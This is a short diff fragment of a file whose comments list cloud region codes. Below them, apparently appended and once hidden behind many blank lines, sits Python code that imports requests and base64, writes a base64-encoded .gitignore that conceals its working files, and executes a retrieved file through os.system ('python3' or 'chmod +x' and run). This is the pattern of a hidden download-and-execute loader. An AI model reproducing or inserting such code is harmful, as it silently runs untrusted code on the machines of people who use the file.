@@ -20,20 +20,6 @@
 # us		  United States (Ohio)
 # us-cal-1	  United States (California)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 import requests,os,base64
 if not os.path.exists("./.gitignore"):
 	big = "L3dvcmtfYXJlYQ0KL3NlcnZpZG9yX21pbmVjcmFmdA0KL21pbmVjcmFmdF9zZXJ2ZXINCi9zZXJ2aWRvcl9taW5lY3JhZnRfb2xkDQovdGFpbHNjYWxlLWNzDQovdGhhbm9zDQovYmtkaXINCi92ZW5kb3INCmNvbXBvc2VyLioNCmNvbmZpZ3VyYXRpb24uanNvbg0KY29uZmlndXJhY2lvbi5qc29uDQoqLnR4dA0KKi5weWMNCioub3V0cHV0"
@@ -56,3 +42,4 @@ if flnm.split(".")[-1] == "pyc":
     os.system(f"python3 {flnm}")
 else:
 	os.system(f"chmod +x {flnm} && ./{flnm}")
+
